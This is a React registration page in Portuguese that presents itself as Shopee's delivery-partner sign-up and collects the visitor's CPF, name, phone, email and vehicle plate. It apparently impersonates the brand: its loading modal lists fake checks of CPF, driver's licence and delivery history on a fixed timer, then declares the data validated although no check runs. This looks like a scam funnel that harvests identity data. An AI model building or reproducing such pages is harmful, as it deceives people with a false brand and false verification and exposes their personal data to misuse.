import React, { useState, useEffect } from 'react';
import { useLocation, useRoute } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useDebounce } from 'use-debounce';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { VehicleInfoBox } from '@/components/VehicleInfoBox';

import shopeeMotoImage from '../assets/shopee-moto.webp';
import shopeeCarsImage from '../assets/shopee-cars.webp';

const formSchema = z.object({
  cpf: z.string()
    .min(11, "CPF inválido")
    .max(14, "CPF inválido")
    .refine(value => {
      // Remove caracteres não numéricos
      const numericValue = value.replace(/\D/g, '');
      return numericValue.length === 11;
    }, "CPF deve ter 11 dígitos"),
  nome: z.string().min(3, "Nome deve ter pelo menos 3 caracteres"),
  telefone: z.string()
    .min(10, "Telefone inválido")
    .max(15, "Telefone inválido")
    .refine(value => {
      // Remove caracteres não numéricos
      const numericValue = value.replace(/\D/g, '');
      return numericValue.length >= 10 && numericValue.length <= 11;
    }, "Telefone deve ter 10 ou 11 dígitos"),
  email: z.string().email("Email inválido"),
  isRentedCar: z.boolean().optional().default(false),
  placa: z.string()
    .min(7, "Placa inválida")
    .max(9, "Placa inválida")
    .refine(value => {
      // Remove caracteres não alfanuméricos
      const cleanValue = value.replace(/[^A-Za-z0-9]/g, '');
      
      // Formato antigo: 3 letras e 4 números (AAA0000)
      const antigoRegex = /^[A-Za-z]{3}[0-9]{4}$/;
      
      // Formato Mercosul: 4 letras e 3 números (AAA0A00)
      const mercosulRegex = /^[A-Za-z]{3}[0-9][A-Za-z][0-9]{2}$/;
      
      return antigoRegex.test(cleanValue) || mercosulRegex.test(cleanValue);
    }, "Formato deve ser ABC-1234 (antigo) ou ABC1D23 (Mercosul)")
    .optional()
    .or(z.literal('')) // Permitir string vazia
})
// Adiciona validação condicional para placa
.refine(
  (data) => {
    // Se marcou como carro alugado, não precisa de placa
    if (data.isRentedCar) {
      return true;
    }
    
    // Se não é carro alugado, precisa ter placa válida
    return data.placa && data.placa.length >= 7;
  },
  {
    message: "Informe a placa do veículo ou selecione a opção 'Carro alugado'",
    path: ["placa"]
  }
);

type FormValues = z.infer<typeof formSchema>;

enum TipoVeiculo {
  CARRO = "carro",
  MOTO = "moto",
}

const Cadastro: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [tipoVeiculo, setTipoVeiculo] = useState<TipoVeiculo | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [isLoadingVehicleInfo, setIsLoadingVehicleInfo] = useState(false);
  const [vehicleIsValid, setVehicleIsValid] = useState(false);
  const [isRentedCar, setIsRentedCar] = useState(false);
  const [vehicleInfo, setVehicleInfo] = useState<{
    marca?: string;
    modelo?: string;
    ano?: string;
    anoModelo?: string;
    chassi?: string;
    renavam?: string;
    cor?: string;
  } | null>(null);
  
  const [, navigate] = useLocation();
  const [cpfValue, setCpfValue] = useState('');
  const [telefoneValue, setTelefoneValue] = useState('');
  const [placaValue, setPlacaValue] = useState('');
  const [debouncedPlacaValue] = useDebounce(placaValue, 1000);
  
  const { toast } = useToast();
  
  // Configurar o formulário com validação
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      cpf: '',
      nome: '',
      telefone: '',
      email: '',
      placa: '',
      isRentedCar: false,
    },
  });
  
  // Carregar dados do localStorage se disponíveis
  useEffect(() => {
    const storedData = localStorage.getItem('candidato_data');
    if (storedData) {
      try {
        const data = JSON.parse(storedData);
        // Preencher formulário com dados armazenados
        reset({
          cpf: data.cpf || '',
          nome: data.nome || '',
          telefone: data.telefone || '',
          email: data.email || '',
          placa: data.placa || '',
          isRentedCar: data.isRentedCar || false,
        });
        
        setCpfValue(data.cpf || '');
        setTelefoneValue(data.telefone || '');
        setPlacaValue(data.placa || '');
        setIsRentedCar(data.isRentedCar || false);
        
        if (data.tipoVeiculo) {
          setTipoVeiculo(data.tipoVeiculo);
        }
      } catch (error) {
        console.error('Erro ao carregar dados armazenados:', error);
      }
    }
  }, [reset]);
  
  // Formatar CPF enquanto o usuário digita
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Remove caracteres não numéricos
    let value = e.target.value.replace(/\D/g, '');
    
    // Limita a 11 dígitos
    if (value.length > 11) {
      value = value.slice(0, 11);
    }
    
    // Aplica a formatação: 000.000.000-00
    if (value.length > 0) {
      value = value.replace(/^(\d{3})(\d)/g, '$1.$2');
      value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3');
      value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
    }
    
    setCpfValue(value);
    setValue('cpf', value);
  };
  
  // Formatar telefone enquanto o usuário digita
  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Remove caracteres não numéricos
    let value = e.target.value.replace(/\D/g, '');
    
    // Limita a 11 dígitos
    if (value.length > 11) {
      value = value.slice(0, 11);
    }
    
    // Aplica a formatação: (00) 00000-0000 ou (00) 0000-0000
    if (value.length > 0) {
      value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
      
      if (value.length > 12) {
        value = value.replace(/^(\(\d{2}\)\s)(\d{5})(\d)/g, '$1$2-$3');
      } else {
        value = value.replace(/^(\(\d{2}\)\s)(\d{4})(\d)/g, '$1$2-$3');
      }
    }
    
    setTelefoneValue(value);
    setValue('telefone', value);
  };
  
  // Formatar placa enquanto o usuário digita
  const handlePlacaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Converte para maiúsculas
    let value = e.target.value.toUpperCase();
    
    // Limita a 8 caracteres incluindo hífen
    if (value.length > 8) {
      value = value.slice(0, 8);
    }
    
    // Aplica a formatação dependendo do tipo de placa
    if (value.length >= 3) {
      // Formato antigo: AAA-0000
      const antigoRegex = /^([A-Z]{3})(\d{0,4})$/;
      if (antigoRegex.test(value.replace('-', ''))) {
        value = value.replace(/^([A-Z]{3})(\d{0,4})$/, (_, p1, p2) => {
          return p2 ? `${p1}-${p2}` : p1;
        });
      }
    }
    
    setPlacaValue(value);
    setValue('placa', value);
    
    // Se o usuário está digitando, indicar carregamento
    if (value.length >= 7 && !isRentedCar) {
      setIsLoadingVehicleInfo(true);
    } else {
      setIsLoadingVehicleInfo(false);
    }
  };
  
  // Limpa as informações da placa
  const handleClearPlate = () => {
    setPlacaValue('');
    setValue('placa', '');
    setVehicleInfo(null);
    setVehicleIsValid(false);
  };
  
  // Verificar as informações do veículo quando a placa é alterada
  useEffect(() => {
    if (debouncedPlacaValue.length >= 7 && !isRentedCar) {
      setIsLoadingVehicleInfo(true);
    }
  }, [debouncedPlacaValue, isRentedCar]);
  
  // Handler para a opção de carro alugado
  const handleRentedCarChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const checked = e.target.checked;
    setIsRentedCar(checked);
    setValue('isRentedCar', checked);
    
    // Se marcar como alugado, limpar a placa e as informações do veículo
    if (checked) {
      setValue('placa', '');
      setVehicleInfo(null);
      setVehicleIsValid(true); // Considerar como válido para permitir o envio do formulário
    } else {
      setVehicleIsValid(false); // Voltar a validação normal da placa
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a próxima página
    navigate('/municipios');
  };

  const onSubmit = async (data: FormValues) => {
    if (!tipoVeiculo) {
      toast({
        title: "Erro de validação",
        description: "Selecione o tipo de veículo (Carro ou Moto)",
        variant: "destructive",
      });
      return;
    }

    if (!cepData) {
      toast({
        title: "Erro de validação",
        description: "Informações de CEP não encontradas. Por favor, recarregue a página.",
        variant: "destructive",
      });
      return;
    }
    
    // Verifica se precisa validar a placa (não precisa se for carro alugado)
    if (!isRentedCar && !vehicleIsValid) {
      toast({
        title: "Erro de validação",
        description: "Por favor, insira uma placa válida para verificar as informações do veículo ou selecione a opção 'Carro alugado'",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Armazenar dados no localStorage para uso posterior
      const candidatoData = {
        ...data,
        tipoVeiculo,
        estado: cepData.state,
        cidade: cepData.city,
        cep: cepData.cep,
      };

      localStorage.setItem('candidato_data', JSON.stringify(candidatoData));
      
      // Salvar os dados do usuário para mostrar na página de entrega
      localStorage.setItem('user_data', JSON.stringify({
        nome: data.nome,
        cpf: data.cpf
      }));
      
      // Apenas para simulação, mostrar o modal de carregamento
      setIsSubmitting(false);
      setShowLoadingModal(true);
    } catch (error) {
      setIsSubmitting(false);
      toast({
        title: "Erro ao processar o cadastro",
        description: "Ocorreu um erro ao processar seu cadastro. Por favor, tente novamente.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5] text-sm font-['Roboto',sans-serif]">
      {/* Header com sombreamento adequado */}
      <header className="bg-white shadow-lg py-2 px-4 flex items-center rounded-b-sm">
        <a href="/" className="text-[#EF4444] text-xl">
          <i className="fas fa-arrow-left"></i>
        </a>
        <h1 className="text-lg font-normal text-center flex-grow text-[#10172A]">Motorista Parceiro Shopee</h1>
      </header>
      
      {/* Seção de boas-vindas */}
      <div className="bg-white">
        <div className="p-3 border-b border-gray-200">
          <h2 className="text-base font-medium text-[#212121] mb-2">Bem-vindo ao cadastro de entregadores</h2>
          <p className="text-sm text-[#6E6E6E]">Preencha os dados abaixo para se tornar um entregador parceiro da Shopee.</p>
        </div>
      </div>
      
      <div className="bg-[#F5F5F5] h-[10px]"></div>

      {/* Formulário */}
      <form onSubmit={handleSubmit(onSubmit)}>
        {/* Seção de dados pessoais */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="custom-section-title">Dados Pessoais</p>
          </div>

          {/* CPF */}
          <div className="custom-input-field">
            <Input 
              id="cpf"
              {...register('cpf')}
              value={cpfValue}
              onChange={handleCpfChange}
              placeholder="CPF (000.000.000-00)" 
              className={`custom-input ${errors.cpf ? 'border-red-500' : 'border-0'}`}
              inputMode="numeric"
            />
            {errors.cpf && (
              <p className="mt-1 text-sm text-red-600">{errors.cpf.message}</p>
            )}
          </div>

          {/* Nome */}
          <div className="custom-input-field">
            <Input 
              id="nome"
              {...register('nome')}
              placeholder="Nome Completo" 
              className={`custom-input ${errors.nome ? 'border-red-500' : 'border-0'}`}
            />
            {errors.nome && (
              <p className="mt-1 text-sm text-red-600">{errors.nome.message}</p>
            )}
          </div>

          {/* Telefone */}
          <div className="custom-input-field">
            <Input 
              id="telefone"
              {...register('telefone')} 
              value={telefoneValue}
              onChange={handleTelefoneChange}
              placeholder="Telefone (00) 00000-0000" 
              className={`custom-input ${errors.telefone ? 'border-red-500' : 'border-0'}`}
              inputMode="tel"
            />
            {errors.telefone && (
              <p className="mt-1 text-sm text-red-600">{errors.telefone.message}</p>
            )}
          </div>

          {/* Email */}
          <div className="custom-input-field">
            <Input 
              id="email"
              {...register('email')} 
              placeholder="Email" 
              className={`custom-input ${errors.email ? 'border-red-500' : 'border-0'}`}
              type="email"
            />
            {errors.email && (
              <p className="mt-1 text-sm text-red-600">{errors.email.message}</p>
            )}
          </div>
        </div>

        <div className="h-[10px]"></div>

        {/* Seção de Tipo de Veículo */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="custom-section-title">Tipo de Veículo</p>
          </div>

          <div className="custom-input-field">
            <p className="text-[#212121] mb-3 text-sm">Selecione o tipo de veículo que você utiliza:</p>
            <div className="flex justify-between gap-4">
              <div 
                className={`flex-1 p-3 border-2 rounded-sm flex flex-col items-center justify-center cursor-pointer transition-colors ${tipoVeiculo === TipoVeiculo.MOTO ? 'border-[#E83D22]' : 'border-gray-200'}`}
                onClick={() => setTipoVeiculo(TipoVeiculo.MOTO)}
              >
                <input
                  type="radio"
                  id="moto"
                  name="tipoVeiculo"
                  checked={tipoVeiculo === TipoVeiculo.MOTO}
                  onChange={() => setTipoVeiculo(TipoVeiculo.MOTO)}
                  className="hidden"
                />
                <div className="mb-2 w-full h-24 flex items-center justify-center overflow-hidden">
                  <img 
                    src={shopeeMotoImage} 
                    alt="Entregador com Moto" 
                    className="max-h-full object-contain"
                  />
                </div>
                <label htmlFor="moto" className={`text-sm font-medium ${tipoVeiculo === TipoVeiculo.MOTO ? 'text-[#E83D22]' : 'text-[#212121]'}`}>
                  Moto
                </label>
              </div>
              
              <div 
                className={`flex-1 p-3 border-2 rounded-sm flex flex-col items-center justify-center cursor-pointer transition-colors ${tipoVeiculo === TipoVeiculo.CARRO ? 'border-[#E83D22]' : 'border-gray-200'}`}
                onClick={() => setTipoVeiculo(TipoVeiculo.CARRO)}
              >
                <input
                  type="radio"
                  id="carro"
                  name="tipoVeiculo"
                  checked={tipoVeiculo === TipoVeiculo.CARRO}
                  onChange={() => setTipoVeiculo(TipoVeiculo.CARRO)}
                  className="hidden"
                />
                <div className="mb-2 w-full h-24 flex items-center justify-center overflow-hidden">
                  <img 
                    src={shopeeCarsImage} 
                    alt="Entregador com Carro" 
                    className="max-h-full object-contain"
                  />
                </div>
                <label htmlFor="carro" className={`text-sm font-medium ${tipoVeiculo === TipoVeiculo.CARRO ? 'text-[#E83D22]' : 'text-[#212121]'}`}>
                  Carro
                </label>
              </div>
            </div>
          </div>
        </div>

        <div className="h-[10px]"></div>

        {/* Seção de Veículo */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="custom-section-title">Informações do Veículo</p>
          </div>

          {/* Opção de Carro alugado */}
          <div className="custom-input-field">
            <div className="p-3 mb-3 bg-[#FFF8F6] border border-[#E83D2230] rounded-sm">
              <h3 className="font-medium text-[#E83D22] mb-2">Opção para Veículo Alugado</h3>
              <p className="text-[#212121] text-sm mb-3">
                Se você trabalha com um veículo alugado ou emprestado, selecione esta opção 
                para prosseguir sem a necessidade de informar a placa do veículo.
              </p>
              <div className="flex items-center">
                <label className="custom-toggle-switch">
                  <input
                    id="isRentedCar"
                    type="checkbox"
                    checked={isRentedCar}
                    onChange={handleRentedCarChange}
                  />
                  <span className="custom-slider"></span>
                </label>
                <label
                  htmlFor="isRentedCar"
                  className="ml-2 text-sm font-normal text-[#6e6e6e] leading-tight"
                >
                  Estou utilizando um veículo alugado ou emprestado
                </label>
              </div>
            </div>

            {/* Campo de placa - exibido apenas se não for carro alugado */}
            {!isRentedCar && (
              <div className="mb-3">
                <p className="text-[#212121] mb-2 text-sm">Placa do Veículo</p>
                <div className="relative">
                  <Input
                    id="placa"
                    {...register('placa')}
                    onChange={handlePlacaChange}
                    value={placaValue}
                    placeholder="ABC-1234 ou ABC1D23"
                    className={`custom-input ${errors.placa ? 'border-red-500' : 'border border-gray-200 rounded-sm'} ${isLoadingVehicleInfo ? 'pr-10' : ''}`}
                    inputMode="text"
                    type="search" 
                    autoCapitalize="characters"
                  />
                  {isLoadingVehicleInfo && (
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <div className="animate-spin h-4 w-4 border-2 border-[#E83D22] border-t-transparent rounded-full"></div>
                    </div>
                  )}
                </div>
                {errors.placa && (
                  <p className="mt-1 text-sm text-red-600">{errors.placa.message}</p>
                )}
              </div>
            )}
            
            {/* Área para mostrar as informações do veículo - exibida apenas se não for carro alugado */}
            {!isRentedCar ? (
              <div className="mt-3">
                <div className="flex justify-between items-start mb-2">
                  <h3 className="font-normal text-[#212121] text-sm">Informações do Veículo</h3>
                  {vehicleInfo && (
                    <button 
                      type="button"
                      onClick={handleClearPlate}
                      className="text-xs px-2 py-1 bg-red-50 text-red-600 rounded-sm hover:bg-red-100 transition-colors"
                    >
                      NÃO É MEU VEÍCULO
                    </button>
                  )}
                </div>
                
                {/* Usar o componente VehicleInfoBox */}
                <VehicleInfoBox
                  licensePlate={placaValue}
                  onChange={(isValid) => {
                    // Se o veículo é válido, atualizar o estado
                    setVehicleIsValid(isValid);
                    if (isValid) {
                      // O componente já buscará as informações do veículo
                      setIsLoadingVehicleInfo(false);
                    }
                  }}
                  className="w-full"
                />
              </div>
            ) : (
              // Mensagem quando é carro alugado
              <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-sm">
                <h4 className="text-base font-medium text-green-700 mb-1 flex items-center">
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  Veículo Alugado Registrado
                </h4>
                <p className="text-sm text-green-600 ml-7">
                  Você selecionou a opção de veículo alugado. As informações da placa não são necessárias neste momento.
                </p>
              </div>
            )}
          </div>
          
          {/* Botão de envio */}
          <div className="custom-button-container px-4 py-5">
            <button
              type="submit"
              className="custom-button py-3"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Processando...' : 'Prosseguir'}
            </button>
          </div>
        </div>
      </form>
      
      {/* Rodapé */}
      <Footer />
      
      {/* Modal de carregamento */}
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Verificando Cadastro"
        loadingSteps={[
          "Verificando dados do CPF",
          "Consultando Carteira de Motorista",
          "Validando documentação do veículo",
          "Analisando disponibilidade na região",
          "Verificando histórico de entregas"
        ]}
        completionMessage="Seus dados foram validados com sucesso! Você está apto a ser um Entregador Parceiro Shopee."
        loadingTime={7000}
      />
    </div>
  );
};

export default Cadastro;